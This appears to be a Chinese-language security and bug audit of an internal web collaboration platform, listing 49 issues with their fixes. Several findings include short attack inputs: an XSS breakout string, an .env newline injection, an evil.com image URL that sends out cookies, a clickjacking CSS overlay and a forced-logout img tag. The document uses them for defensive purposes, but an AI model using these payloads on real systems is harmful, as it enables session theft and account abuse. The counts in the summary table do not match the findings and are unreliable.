# TUZHAN 协作中心 — Bug 报告

> 生成时间: 2026-04-05
> 扫描范围: 全部源码 (`src/`, `scripts/`, `config/`, `templates/`, `static/`)

---

## 严重 (Critical)

### BUG-01: Cookie 伪造导致任意用户身份冒充 & 管理员后台绕过 — ✅ 已修复

**文件**: `src/api/server.py`

**修复方案**: 新增 `_verify_session(emp_id, private_key)` 校验函数，在 `GET /`、`GET /dashboard`、`GET /admin/login`、`GET /admin/dashboard` 中均通过数据库验证 `private_key` 与 `emp_id` 的对应关系，伪造 Cookie 不再能绕过认证。

---

### BUG-02: Private Key 明文存储在 Cookie 中，且未设置安全属性 — ✅ 已修复

**文件**: `src/api/server.py`

**修复方案**: 所有 `set_cookie` 调用统一使用 `COOKIE_OPTS = {"httponly": True, "samesite": "Lax"}`，JavaScript 无法再通过 `document.cookie` 读取凭证，同时防御 CSRF。生产环境上线 HTTPS 后应额外加入 `secure=True`。

---

## 高 (High)

### BUG-03: 管理员权限硬编码，`is_admin` 字段形同虚设 — ✅ 已修复

**文件**: `src/api/server.py`

**修复方案**: 将所有管理员接口中 `user_info.get("emp_id") != "TZa1b2c3"` 和 `user_info.get("emp_id") != "TZzhjiac"` 的硬编码检查统一改为 `not user_info.get("is_admin")`，使数据库 `is_admin` 字段和 `admin grant/revoke` 命令真正生效。

---

### BUG-04: Message ID 截断导致碰撞风险 — ✅ 已修复

**文件**: `src/core/message_manager.py`

**修复方案**: 将 `str(uuid.uuid4())[:8]` 改为 `str(uuid.uuid4())`，使用完整 36 字符 UUID，彻底消除碰撞风险。

---

### BUG-05: 消息发送无接收人校验 — ✅ 已修复

**文件**: `src/core/message_manager.py`, `src/api/server.py`

**修复方案**: 在 `MessageManager.send_message()` 中增加 `get_user_info(receiver)` 校验，不存在的接收人将被跳过并记录警告日志。`send_message` 返回值新增 `invalid_receivers` 列表，API 端点 `/api/messages/send` 会将无效接收人信息返回给调用方。

---

### BUG-06: `/api/projects` 和 `/api/llm/convert` 使用 Cookie 认证而非 Bearer Token — ✅ 已修复

**文件**: `src/api/server.py`

**修复方案**: 两个端点改为同时支持 `Authorization: Bearer <key>` Header 和 `private_key` Cookie 认证，优先使用 Bearer Token。API 客户端和 AI Agent 现在可以通过标准 Bearer Token 正常调用这两个接口。

---

### BUG-16: 管理员 POST 接口缺失 `private_key` 会话校验，仅凭 `emp_id` Cookie 即可操作 — ✅ 已修复

**文件**: `src/api/server.py:235-404`

**描述**: 以下所有管理员 POST 接口仅从 Cookie 中读取 `emp_id` 并查询其 `is_admin` 状态，**未校验 `private_key`**：
- `POST /admin/users/{id}/regenerate-key` (第 235 行)
- `POST /admin/users/{id}/identity` (第 264 行)
- `POST /admin/users/{id}/status` (第 283 行)
- `POST /admin/projects` (第 310 行)
- `POST /admin/projects/{name}/members` (第 329 行)
- `POST /admin/projects/{name}/description` (第 355 行)
- `DELETE /admin/projects/{name}/members/{id}` (第 371 行)
- `POST /admin/projects/{name}/members/{id}/role` (第 390 行)

与 `GET /admin/dashboard` 的双重校验（`_verify_session` + `is_admin`）不同，这些接口只检查了 `emp_id` Cookie 的 `is_admin` 字段。攻击者只需将浏览器 Cookie 中的 `emp_id` 手动改为一个已知的管理员工号（如 `TZzhjiac`），即可绕过认证执行全部管理操作（重生成密钥、禁用账号、编辑项目等），**无需知道管理员的 Private Key**。

**影响**: 任何已知管理员工号的攻击者都可以在无密钥的情况下执行所有管理员操作，等同于管理员后台完全暴露。

**修复方案**: 新增 `_require_admin(emp_id, private_key)` 公共校验函数，内部同时调用 `_verify_session` 验证会话有效性和 `is_admin` 管理员权限。所有 9 个管理员 POST/DELETE 接口均已增加 `private_key: str = Cookie(None)` 参数，并在入口处统一调用 `_require_admin()` 进行双重校验。

---

### BUG-17: 已禁用用户仍可访问 Web 控制台和管理后台 — ✅ 已修复

**文件**: `src/api/server.py:70-80, 128-151, 184-230`

**描述**: `_verify_session()` 内部调用 `get_user_by_key(private_key, active_only=False)`，即**不过滤已禁用账号**。以下页面路由在 `_verify_session` 通过后**未检查用户 `status` 是否为 `disabled`**：

- `GET /` (第 88 行)：已禁用用户被重定向到 `/dashboard` 而非登录页
- `GET /dashboard` (第 128-151 行)：已禁用用户可正常查看控制台、收发件箱、项目信息
- `GET /admin/login` (第 153-158 行)：已禁用的管理员仍可跳转至管理后台
- `GET /admin/dashboard` (第 184-230 行)：已禁用的管理员仍可查看全站数据

相比之下，API 端（`/api/messages/send`、`/api/messages/receive` 等）正确地在 `_verify_session` 之后单独检查了 `status == "disabled"`，但 Web 端遗漏了。

**影响**: 管理员通过后台禁用某账号后，该用户只要浏览器中仍保留有效 Cookie，就可以继续使用 Web 控制台的全部功能，禁用操作形同虚设。

**修复方案**: 在 `_verify_session()` 中将 `get_user_by_key(private_key, active_only=False)` 改为 `active_only=True`。所有依赖 `_verify_session` 的 Web 路由（`GET /`、`GET /dashboard`、`GET /admin/login`、`GET /admin/dashboard`）以及 `_require_admin()` 均自动受益，已禁用用户的会话立即失效。登录和 API 端点不受影响，因为它们各自独立调用 `get_user_by_key(active_only=False)` 并手动检查 disabled 状态以返回友好的错误提示。

---

### BUG-22: SQLite 外键约束从未启用，`ON DELETE CASCADE` 形同虚设

**文件**: `src/core/database.py:28-31, 134-145`

```python
def get_connection(self):
    conn = sqlite3.connect(self.db_path)
    conn.row_factory = sqlite3.Row
    return conn
```

**描述**: `project_members` 表声明了 `FOREIGN KEY ... ON DELETE CASCADE`，但 SQLite 默认禁用外键约束。代码中从未执行 `PRAGMA foreign_keys = ON`。这导致：
1. 删除项目时**不会**级联删除其成员记录，`project_members` 中产生孤儿数据
2. 可以插入引用不存在项目或用户的 `project_member` 记录，不会报错
3. `delete_project()` 方法（第 188-193 行）也未手动清理关联的成员记录

**影响**: 数据完整性被静默破坏，孤儿数据随时间累积。

**修复建议**: 在 `get_connection()` 中添加 `conn.execute("PRAGMA foreign_keys = ON")`，或在 `delete_project()` 中显式删除关联的 `project_members` 记录。

---

### BUG-23: `editMemberRole` 存在 DOM XSS 漏洞

**文件**: `src/templates/admin_dashboard.html:829`

```javascript
spanElement.setAttribute('ondblclick', `editMemberRole(this, '${projectName}', '${empId}', '${newRole}')`);
```

**描述**: 更新成员角色后，`newRole` 的值从输入框直接拼接进 `ondblclick` 属性字符串，未做任何转义。如果 `newRole` 包含单引号（例如 `Dev'); alert('XSS`），即可突破字符串边界执行任意 JavaScript。这是一个**存储型 XSS**：如果角色值被持久化并重新渲染，每次加载页面都会触发。

**影响**: 任何可编辑角色的管理员用户都可以注入恶意脚本，窃取其他管理员的会话凭证。

**修复建议**: 使用 `addEventListener` 代替字符串拼接构建 `ondblclick`：
```javascript
spanElement.removeAttribute('ondblclick');
spanElement.addEventListener('dblclick', function() {
    editMemberRole(this, projectName, empId, newRole);
});
```

---

### BUG-24: 所有 POST 表单和 AJAX 请求缺乏 CSRF 防护

**文件**: 所有模板文件及 `fetch()` 调用

**描述**: 整个系统中没有任何 CSRF Token 机制。所有表单 POST 端点（`/login`、`/admin/login`、`/dashboard/send`、`/dashboard/profile`）和所有管理员 AJAX 操作（重生成密钥、禁用账号、编辑项目等）仅依赖 Cookie 进行认证。恶意网站可构造表单自动提交请求，利用受害者的已认证会话执行操作。

虽然 `SameSite=Lax` Cookie 属性可缓解跨站 POST 攻击，但 `Lax` 仅阻止跨站 POST 的顶层导航——**不能**阻止所有攻击向量（如某些浏览器版本或特定重定向链）。

**影响**: 攻击者可让已登录用户在不知情的情况下发送消息、修改个人资料，甚至执行管理员操作。

**修复建议**: 使用 `starlette-csrf` 或自定义双提交 Cookie 模式，在所有状态变更的 POST 请求中验证 CSRF Token。

---

## 中 (Medium)

### BUG-07: `WorkspaceManager` 读取 `departments` 但配置文件中使用 `projects` — ✅ 已修复

**文件**: `src/core/workspace_manager.py:44`

**修复方案**: 已将 `departments` 改为 `projects`，读取逻辑与 `org_chart.yaml` 配置一致。

---

### BUG-08: 数据库升级逻辑中 `is_admin` 列可能丢失

**文件**: `src/core/database.py:45-56, 82-84`

**描述**: `_upgrade_db()` 中，如果触发了 `username` 迁移：
1. 创建 `users_new` 表时**不包含** `is_admin` 列（第 47-57 行）
2. 删除旧表并重命名新表
3. 然后用**旧表的列列表** `columns` 来判断是否需要添加 `is_admin`（第 83 行）

如果旧表中已有 `is_admin` 列，`'is_admin' not in columns` 为 False，ALTER TABLE 被跳过。但新表根本没有 `is_admin` 列，导致该字段永久丢失。此外，`columns` 变量在表重建后未被重新获取（stale reference），使得后续所有列检查基于已删除的旧表结构。

**修复建议**: 在 `users_new` 表定义中加入 `is_admin INTEGER DEFAULT 0`，并在迁移 INSERT 语句中包含该字段。同时在表重建后重新执行 `PRAGMA table_info(users)` 刷新 `columns` 列表。

---

### BUG-09: 裸 `except` 吞掉所有异常

**文件**: `src/api/server.py:139, 205`

```python
try:
    projects = json.loads(user_info["projects"])
except:
    pass
```

**描述**: 使用裸 `except:` 会捕获所有异常，包括 `SystemExit`、`KeyboardInterrupt`、`MemoryError` 等不应被静默忽略的异常。且 `pass` 吞掉了错误，当 `projects` JSON 数据损坏时无任何日志记录。此问题在两处出现：第 139 行（用户控制台）和第 205 行（管理员后台）。

**修复建议**: 改为 `except (json.JSONDecodeError, TypeError):` 并记录警告日志。

---

### BUG-10: YAML 文件并发读写无锁保护 — ✅ 已修复（不再适用）

**文件**: `src/api/server.py`

**说明**: 项目已将数据全面迁移到 SQLite 数据库，`server.py` 中不再存在对 `org_chart.yaml` 的运行时写入操作。SQLite 自身提供了文件锁机制，此问题不再适用。

---

### BUG-11: `init_data.json` 中的管理员与硬编码管理员工号不一致 — ✅ 已修复

**文件**: `config/init_data.json`, `src/api/server.py`

**说明**: BUG-03 修复后，所有管理员权限检查均改为基于 `is_admin` 字段，不再依赖硬编码工号。`init_data.json` 中 `TZzhjiac` 配置的 `"is_admin": true` 现在可以正确生效。

---

### BUG-12: LLM 接口报错信息泄露内部细节

**文件**: `src/api/server.py:586`

```python
raise HTTPException(status_code=500, detail=f"智能转换失败: {str(e)}")
```

**描述**: 将完整的异常信息（可能包含 API Key、内部 URL、堆栈细节等）直接返回给客户端。

**修复建议**: 生产环境中返回通用错误信息，将详细错误仅记录到服务端日志。

---

### BUG-18: 管理后台「编辑身份设定」弹窗读取不存在的 `data-username` 属性导致显示 "null"

**文件**: `src/templates/admin_dashboard.html:794`

```javascript
const username = btnElement.getAttribute('data-username');
```

**描述**: `openIdentityModal()` 函数从按钮元素读取 `data-username` 属性，但按钮上实际定义的属性是 `data-nickname`（第 476 行）：
```html
<button ... data-emp="{{ u.emp_id }}" data-nickname="{{ u.nickname }}" data-identity="{{ u.identity_md or '' }}" ...>
```

由于 `data-username` 不存在，`getAttribute('data-username')` 返回 `null`，导致：
1. 弹窗标题显示为 `编辑身份设定: null (TZxxx)`
2. 默认模板中姓名显示为 `null`

**影响**: 管理员首次为员工编辑身份设定时，弹窗中的员工姓名显示为 "null"，需要手动修正模板中的名称。

**修复建议**: 将 `btnElement.getAttribute('data-username')` 改为 `btnElement.getAttribute('data-nickname')`。

---

### BUG-19: `.env` 文件写入未做输入净化，可注入任意环境变量

**文件**: `src/api/server.py:418-437`

```python
with open(env_file, 'w', encoding='utf-8') as f:
    for line in lines:
        if line.startswith("LLM_API_KEY="):
            f.write(f"LLM_API_KEY={req.llm_api_key}\n")
            ...
```

**描述**: 管理员通过 `POST /admin/config/llm-key` 提交的 `llm_api_key` 值未经过任何验证和净化，直接拼接写入 `.env` 文件。如果提交的值包含换行符（如 `fake-key\nSECRET_TOKEN=hacked`），则可向 `.env` 中注入任意环境变量。下次服务重启时，注入的变量会被 `load_dotenv()` 加载到进程环境中。

**影响**: 拥有管理员权限的用户可覆盖系统任意环境变量（如 `TUZHAN_ENV`），影响系统行为。结合 BUG-16（管理员接口缺乏 session 校验），此风险进一步放大。

**修复建议**: 对 `llm_api_key` 进行验证——拒绝包含换行符 `\n`、`\r` 或等号 `=` 的输入。

---

### BUG-20: 消息状态永久为 "unread"，缺少已读标记机制 — ✅ 已修复

**文件**: `src/core/database.py`, `src/api/server.py`

**描述**: `messages` 表中 `status` 字段默认值为 `'unread'`，管理后台也渲染了 "已读/未读" 的 UI（`admin_dashboard.html:572-576`）。但整个系统中不存在任何将消息标记为 `'read'` 的接口或逻辑：
- `DatabaseManager` 类中没有 `mark_as_read` 方法
- 没有 API 端点支持更新消息状态
- 用户在 Web 端查看收件箱后不会触发状态变更

**影响**: 管理员后台的 "已读/未读" 状态永远显示为 "未读"，该功能形同虚设，且可能误导管理员认为所有消息均未被查阅。

**修复方案**: 已采用更科学的 ACK 机制，新增独立的 `POST /api/messages/{id}/read` 接口供 AI Agent 在处理完消息后主动标记已读；同时在 `GET /api/messages/receive` 中增加了 `?status=unread` 过滤功能。后台也可以正常查看已读状态。

---

### BUG-25: API 和 Web 端点使用 `active_only=False` 认证，存在边界绕过风险

**文件**: `src/api/server.py:527, 561, 609, 648, 678, 454, 483`

```python
emp_id = db_manager.get_user_by_key(key, active_only=False)
```

**描述**: 所有 API 端点（`/api/projects`、`/api/llm/convert`、`/api/messages/send`、`/api/messages/receive`、`/api/messages/sent`）及 Web 端的 `/dashboard/send` 和 `/dashboard/profile` 调用 `get_user_by_key` 时使用 `active_only=False`，然后手动检查 `status == "disabled"`。存在以下问题：
1. 如果 `get_user_info` 返回 `None`（已删除用户），`if user_info and user_info.get("status") == "disabled"` 的条件为 `False`，被禁用/删除的用户可能绕过检查
2. 与 `_verify_session`（使用 `active_only=True`）的行为不一致
3. 登录端点同样使用 `active_only=False`，已禁用用户可成功登录并设置 Cookie，但随后所有请求因 `_verify_session` 失败而跳转回登录页，造成困惑的用户体验

**影响**: 潜在的认证绕过边界条件，以及不一致的用户体验。

**修复建议**: 将所有 API 端点的 `get_user_by_key` 改为 `active_only=True`，移除冗余的手动 disabled 检查。登录端点也应在检查状态前使用 `active_only=True` 以立即拒绝已禁用用户。

---

### BUG-26: Markdown 消息允许 `<img>` 标签导致追踪像素攻击

**文件**: `src/api/server.py:47, 52`

```python
allowed_tags = [..., 'img', ...]
allowed_attrs = {
    'img': ['src', 'alt', 'title'],
```

**描述**: bleach 白名单允许 `<img>` 标签及任意 `src` 属性。用户可发送包含 `![x](https://evil.com/track?cookie=steal)` 的 Markdown 消息，渲染为 `<img src="...">` 标签。这使得：
1. 追踪像素攻击——可探测用户是否查看了消息及其 IP 地址
2. 结合内部网络 URL 可进行 SSRF 探测

**影响**: 任何用户可通过发送消息追踪其他用户的查看行为和 IP 地址。

**修复建议**: 为 `img src` 添加 URL 方案白名单（仅允许 `http`/`https`），或如果不需要外部图片，直接从白名单中移除 `img` 标签。

---

### BUG-27: `<span style>` 允许任意 CSS 注入

**文件**: `src/api/server.py:55`

```python
'span': ['class', 'style'],
```

**描述**: bleach 白名单允许 `<span>` 标签携带任意 `style` 属性。恶意用户可构造消息使用 CSS 覆盖整个页面：
```css
position:fixed; top:0; left:0; width:100%; height:100%; z-index:9999; background:white;
```
这将实现 UI 重绘/点击劫持攻击，或通过 `background-image: url(...)` 进行数据外泄。

**修复建议**: 从 `span` 的允许属性中移除 `style`，或使用 CSS 属性白名单库（如 `bleach-allowlist`）限制为安全的 CSS 属性。

---

### BUG-28: 消息内容和身份设定无长度限制，可导致资源耗尽

**文件**: `src/api/server.py:301, 503-506, 449`

```python
class IdentityRequest(BaseModel):
    identity_md: str
class MessageRequest(BaseModel):
    receiver: str
    content: str
```

**描述**: `content`（消息内容）和 `identity_md`（身份设定）均无任何长度约束。用户可提交任意大的载荷（如 100MB 字符串），直接存入 SQLite，可能导致磁盘耗尽或内存溢出。LLM 转换接口同样将无界用户输入传递给 OpenAI API 调用，可能产生高额费用。

**修复建议**: 在 Pydantic 模型中添加 `max_length` 约束（如 `content: str = Field(max_length=50000)`），Form 字段也应添加类似校验。

---

### BUG-29: 管理后台以明文显示所有用户 Private Key

**文件**: `src/templates/admin_dashboard.html:315`

```html
<span class="tz-key-text" id="key-{{ u.emp_id }}">{{ u.private_key }}</span>
```

**描述**: 管理后台页面中，所有员工的 Private Key 以明文渲染在 HTML 中，对管理员可见。密钥嵌入在 DOM 中，会被浏览器历史记录、浏览器插件和代理服务器记录。

**修复建议**: 默认显示遮罩版本（如 `sk-****abcd`），提供"显示"切换按钮，或通过 AJAX 按需获取完整密钥。

---

### BUG-30: LLM API Key 以明文渲染在管理后台页面

**文件**: `src/templates/admin_dashboard.html:474`

```html
<span class="tz-key-text" id="display-llm-key">{{ system_config.llm_api_key }}</span>
```

**描述**: LLM API Key 在管理后台页面初始加载时以完整明文渲染在 HTML 中。虽然 `saveLLMKey()` 函数在保存后会在客户端遮罩，但初始页面加载时完整密钥暴露在 DOM 源码中，可被浏览器插件、XSS 或查看源代码窃取。

**修复建议**: 服务端发送模板前对密钥进行遮罩处理，仅发送遮罩版本（如 `sk-xxxx****xxxx`）到前端。

---

### BUG-31: 开发环境绑定 `0.0.0.0` 暴露在所有网络接口

**文件**: `config/settings.yaml`

```yaml
development:
  server_bind_host: "0.0.0.0"    # 暴露在所有接口
production:
  server_bind_host: "127.0.0.1"  # 仅本地
```

**描述**: 开发/生产环境的绑定地址配置相反——开发环境绑定 `0.0.0.0`（对外暴露），生产环境绑定 `127.0.0.1`（仅本地）。开发环境服务器可被同一网络中的其他设备访问，存在安全风险。如果生产环境中 Nginx 运行在不同容器或主机，将无法连接到 `127.0.0.1`。

**修复建议**: 交换绑定地址——开发使用 `127.0.0.1`，生产使用 `0.0.0.0`（或特定内网 IP）。

---

### BUG-32: `org_chart.yaml` 与 `init_data.json` 不一致，`sync` 命令产生不完整数据

**文件**: `config/org_chart.yaml`, `config/init_data.json`

**描述**: `init_data.json` 定义了三个项目（TUZHAN、TUVE、SEE2AI）和三个用户，但 `org_chart.yaml` 仅包含 TUZHAN 项目和一个成员（TZzhjiac）。执行 `admin.py sync` 时读取 `org_chart.yaml`，导致 TUVE 和 SEE2AI 项目及 TZyangjx、TZlixu01 员工的项目成员关系不会被同步到数据库。此外，TZzhjiac 在 `org_chart.yaml` 中昵称为 "Admin"，但 `init_data.json` 中为 "加葱"，sync 会覆盖正确的昵称。

**修复建议**: 将 `org_chart.yaml` 补齐为与 `init_data.json` 一致的项目和成员信息。

---

### BUG-33: `update_user_key_by_emp_id` 未处理 Private Key 唯一约束冲突

**文件**: `src/core/database.py:351-357`

```python
def update_user_key_by_emp_id(self, emp_id: str, new_key: str) -> bool:
    cursor.execute("UPDATE users SET private_key = ? WHERE emp_id = ?", (new_key, emp_id))
```

**描述**: `private_key` 列有 UNIQUE 约束。如果 `new_key` 与其他用户的密钥碰撞，将抛出未处理的 `sqlite3.IntegrityError` 而非返回 `False`。管理员执行密钥重生成操作会导致 500 错误。

**修复建议**: 使用 `try/except sqlite3.IntegrityError: return False` 包裹。

---

### BUG-34: `save_message` 在消息 ID 重复时抛出未处理异常

**文件**: `src/core/database.py:271-281`

**描述**: 如果 `msg_id` 重复（PRIMARY KEY 碰撞），`INSERT INTO messages` 将抛出未处理的 `sqlite3.IntegrityError`。虽然 BUG-04 修复后碰撞概率极低，但缺少错误处理意味着一旦发生会导致消息发送接口 500 崩溃。

**修复建议**: 捕获 `IntegrityError` 并返回成功/失败指示，或使用 `INSERT OR IGNORE`。

---

### BUG-35: `ensure_user_exists` 更新路径中 `IntegrityError` 未处理

**文件**: `src/core/database.py:296-311`

**描述**: 当更新已存在用户的 `private_key` 时，如果新密钥与其他用户冲突，会抛出 `sqlite3.IntegrityError`。此时同一事务中已执行的 `projects` 和 `nickname` 更新也会被回滚，但调用方不知道哪部分失败了。

**修复建议**: 使用 `try/except sqlite3.IntegrityError` 包裹并优雅处理密钥冲突。

---

### BUG-36: 数据库迁移静默丢弃无法匹配的消息

**文件**: `src/core/database.py:43-44`

```python
cursor.execute("UPDATE messages SET sender = (SELECT emp_id FROM users WHERE users.username = messages.sender) WHERE sender IN (SELECT username FROM users)")
```

**描述**: `username → emp_id` 迁移中，发送者或接收者的 `username` 在 `users` 表中不存在时，该消息的 `sender`/`receiver` 字段保留旧的 username 值。迁移完成后，这些消息引用的标识符在新 schema 中不再有效，消息永久孤立——不会出现在任何用户的收件箱或发件箱中。且无任何日志记录此数据丢失。

**修复建议**: 为无法迁移的消息记录警告日志，或保留原值并添加前缀标记为未迁移记录。

---

### BUG-37: `update_user_status` 接受任意字符串，无状态值校验

**文件**: `src/core/database.py:359-365`

**描述**: 系统假设 `status` 值为 `'active'` 或 `'disabled'`（`get_user_by_key` 按 `status = 'active'` 过滤），但 `update_user_status` 接受任何字符串。传入拼写错误（如 `'actvie'`）会静默锁定用户，且难以发现。

**修复建议**: 校验 `status` 参数仅允许 `{'active', 'disabled'}`，否则抛出 `ValueError`。

---

### BUG-38: 发送消息表单的接收人字段依赖 JS 填充隐藏 input，JS 失败时可提交空接收人

**文件**: `src/templates/dashboard.html:419, 798`

**描述**: 发送消息表单中 `receiver` 值通过 JavaScript 动态填入隐藏的 `<input>` 元素。如果 JavaScript 加载失败或报错，表单仍可提交空的 `receiver` 字段（隐藏 input 的 `required` 属性在各浏览器中行为不一致）。

**修复建议**: 在服务端 `/dashboard/send` 中添加空接收人校验，或在 JavaScript 中阻止空接收人的表单提交。

---

### BUG-39: 自定义 confirm 对话框无键盘支持和无障碍属性

**文件**: `src/static/js/ui.js:43-62`

**描述**: `TZUI.confirm()` 自定义对话框无键盘事件监听（无 Escape 取消、无 Enter 确认）、无焦点陷阱、无 `role="dialog"` 或 `aria-modal="true"` 属性。背景内容仍可通过 Tab 键和屏幕阅读器访问。违反 WCAG 2.1 无障碍标准。

**修复建议**: 添加键盘事件（Escape 取消、Enter 确认）、`role="dialog"`、`aria-modal="true"`、焦点陷阱。

---

## 低 (Low)

### BUG-13: `api_client.py` 中 `.env` 路径计算错误

**文件**: `src/client/api_client.py:14-15`

```python
current_dir = os.path.dirname(os.path.abspath(__file__))
load_dotenv(os.path.join(current_dir, '..', '..', '.env'))
```

**描述**: `api_client.py` 位于 `src/client/` 目录下，`..` 两次回到项目根目录是正确的。但如果该模块被从其他位置导入（如被安装为包），`__file__` 的路径会变化导致找不到 `.env` 文件。此为潜在问题，当前直接运行时不会触发。

---

### BUG-14: `argparse` 重复导入

**文件**: `scripts/init_db.py:6, 112`

**描述**: `argparse` 在文件开头（第 6 行）和 `__main__` 块中（第 112 行）被导入了两次。

**修复建议**: 删除第 112 行的重复导入。

---

### BUG-15: `admin.py sync` 新增员工不会自动获得登录凭证

**文件**: `scripts/admin.py:72-78`

**描述**: `sync_projects_to_db()` 中的 `ensure_user_exists()` 不传 `private_key` 参数。当用户不存在（新员工从 org_chart 同步进来），会以 `private_key=None` 创建用户，该用户将无法登录，直到管理员手动 `keygen`。

**影响**: 通过 `admin.py sync` 新增的员工不会自动获得登录凭证，需要额外执行 `keygen`。这更像是一个工作流缺陷而非代码 bug。

---

### BUG-21: 登录和 API 接口无速率限制，可被暴力破解

**文件**: `src/api/server.py:94-116, 160-182, 588-626`

**描述**: 以下端点接受 Private Key 作为身份凭证，但均未实施任何速率限制（Rate Limiting）或账户锁定机制：
- `POST /login`（用户登录）
- `POST /admin/login`（管理员登录）
- `POST /api/messages/send`（API Bearer Token 认证）
- `GET /api/messages/receive`（API Bearer Token 认证）

攻击者可以对这些端点进行高速暴力枚举 `sk-` 开头的密钥。虽然密钥空间为 `16^32`（128 bit），理论上暴力破解不现实，但缺少速率限制仍属于安全最佳实践的缺失，且可能导致服务器资源被大量恶意请求消耗（DoS 效果）。

**修复建议**: 使用 FastAPI 中间件或 `slowapi` 等库为登录和 API 端点添加速率限制（如每 IP 每分钟 10 次登录尝试），并在多次失败后返回 `429 Too Many Requests`。

---

### BUG-40: `GET /logout` 应为 POST 以防止 CSRF 注销攻击

**文件**: `src/api/server.py:146-152`

```python
@app.get("/logout")
async def logout():
    response = RedirectResponse(url="/", status_code=303)
    response.delete_cookie("emp_id")
    response.delete_cookie("private_key")
```

**描述**: 注销是 GET 请求，任何页面（包括恶意外部站点）可通过嵌入 `<img src="https://target/logout">` 强制用户注销。虽然单独看危害不大，但可与其他攻击链联合使用（先强制注销再引导至钓鱼登录页）。

**修复建议**: 改为 `@app.post("/logout")`，使用表单提交 + CSRF Token。

---

### BUG-41: 管理员可重生成自己的密钥，导致当前会话立即失效

**文件**: `src/api/server.py:279-298`

**描述**: 管理员可以对自己的工号执行密钥重生成操作。执行后，当前会话 Cookie 中仍为旧密钥，所有后续请求的认证都会失败。新密钥虽然在 JSON 响应中返回，但 Cookie 未被更新，管理员会被"锁在门外"。

**修复建议**: 当 `target_emp_id == emp_id` 时，在响应中同步更新 Cookie，或禁止管理员重生成自己的密钥。

---

### BUG-42: API 文档页面无需认证即可访问

**文件**: `src/api/server.py:700-732`

**描述**: `GET /api?format=markdown` 返回完整的 API 文档 Markdown 文件，无任何认证检查。HTML 版本也对未认证用户渲染。这会暴露内部 API 结构和端点信息，有助于攻击者侦察。

**修复建议**: 添加认证检查，或明确标记为公开文档。

---

### BUG-43: `send_message` 返回值类型注解与实际不符

**文件**: `src/core/message_manager.py:22, 57`

```python
def send_message(self, sender: str, receivers: list, content: str) -> list:
    ...
    return msg_ids, invalid_receivers  # 实际返回 tuple
```

**描述**: 类型注解声明返回 `list`，但实际返回的是 `tuple`。虽然 Python 运行时不强制类型注解，但会误导静态分析工具和调用方。

**修复建议**: 改为 `-> tuple[list, list]:`。

---

### BUG-44: `switchTab` 函数从 URL hash 读取未净化的 tabId，存在选择器注入风险

**文件**: `src/templates/admin_dashboard.html:913`, `src/templates/dashboard.html:631`

```javascript
if (!element) element = document.querySelector(`.tz-tab-btn[onclick*="${tabId}"]`);
```

**描述**: `tabId` 来自 `window.location.hash.substring(1)`，虽有 `hash.startsWith('#tab-')` 前置检查，但剩余部分直接拼入 `querySelector`。精心构造的 hash 值可能注入恶意 CSS 选择器。

**修复建议**: 使用已知 tab ID 白名单进行校验。

---

### BUG-45: `api_client.py` 的 `--env` 参数在 subparsers 之后添加，命令行顺序受限

**文件**: `src/client/api_client.py:83, 96-98`

**描述**: `--env` 参数在 `add_subparsers` 之后添加到父 parser。用户必须将 `--env` 放在子命令之前（如 `python api_client.py --env prod send ...`），放在之后则解析失败，不符合直觉。

**修复建议**: 将 `--env` 参数移到 `add_subparsers` 之前定义。

---

### BUG-46: 两个 `DOMContentLoaded` 监听器分别挂载在 `document` 和 `window` 上

**文件**: `src/templates/dashboard.html:588, 641`

```javascript
document.addEventListener('DOMContentLoaded', () => { ... });  // 第 588 行
window.addEventListener('DOMContentLoaded', () => { ... });    // 第 641 行
```

**描述**: `DOMContentLoaded` 事件应在 `document` 上监听。`window.addEventListener('DOMContentLoaded', ...)` 虽然因事件冒泡在多数浏览器中能工作，但技术上不规范，可能在某些环境中不触发。

**修复建议**: 合并为单个 `document.addEventListener('DOMContentLoaded', ...)` 处理器。

---

### BUG-47: 密钥重生成后 Toast 通知以明文显示完整新密钥

**文件**: `src/templates/admin_dashboard.html:611`

```javascript
TZUI.toast('已成功重新生成，新 Key: ' + data.new_key, 'success');
```

**描述**: 密钥重生成后，完整的新 Private Key 在 Toast 通知中明文显示，可被屏幕录制、肩窥或截图捕获。

**修复建议**: Toast 中仅显示遮罩版本，如 `data.new_key.substring(0,6) + '******'`。

---

### BUG-48: 登录表单使用 `autocomplete="off"` 阻碍密码管理器

**文件**: `src/templates/login.html:132`, `src/templates/admin_login.html:155`

```html
<input type="password" ... autocomplete="off">
```

**描述**: 两个登录表单的密码字段设置 `autocomplete="off"`，阻碍密码管理器保存和自动填充凭证，推动用户使用弱密码。现代浏览器通常会忽略密码字段上的 `autocomplete="off"`。

**修复建议**: 改为 `autocomplete="current-password"` 以配合密码管理器。

---

### BUG-49: 每次数据库操作都新建连接，无连接复用

**文件**: `src/core/database.py:28-31`

**描述**: 每个数据库方法都调用 `self.get_connection()` 新建 `sqlite3.connect()` 连接。在并发 Web 请求场景下：
1. 产生不必要的连接开销
2. 每个连接有独立的事务隔离，并发写入可能产生不一致结果
3. 未启用 WAL 模式（`PRAGMA journal_mode=WAL`），写操作会阻塞读操作

**修复建议**: 使用单实例连接或连接池，并设置 WAL 模式以改善并发读写性能。

---

## 汇总

| 级别 | 数量 | Bug 编号 |
|------|------|----------|
| 严重 (Critical) | 2 | BUG-01 ✅, BUG-02 ✅ |
| 高 (High) | 9 | BUG-03 ✅, BUG-04 ✅, BUG-05 ✅, BUG-06 ✅, BUG-16 ✅, BUG-17 ✅, BUG-22, BUG-23, BUG-24 |
| 中 (Medium) | 18 | BUG-07 ✅, BUG-08, BUG-09, BUG-10 ✅, BUG-11 ✅, BUG-12, BUG-18, BUG-19, BUG-20, BUG-25, BUG-26, BUG-27, BUG-28, BUG-29, BUG-30, BUG-31, BUG-32, BUG-33, BUG-34, BUG-35, BUG-36, BUG-37, BUG-38, BUG-39 |
| 低 (Low) | 10 | BUG-13, BUG-14, BUG-15, BUG-21, BUG-40, BUG-41, BUG-42, BUG-43, BUG-44, BUG-45, BUG-46, BUG-47, BUG-48, BUG-49 |
| **合计** | **49** | 已修复: 10 / 未修复: 39 |
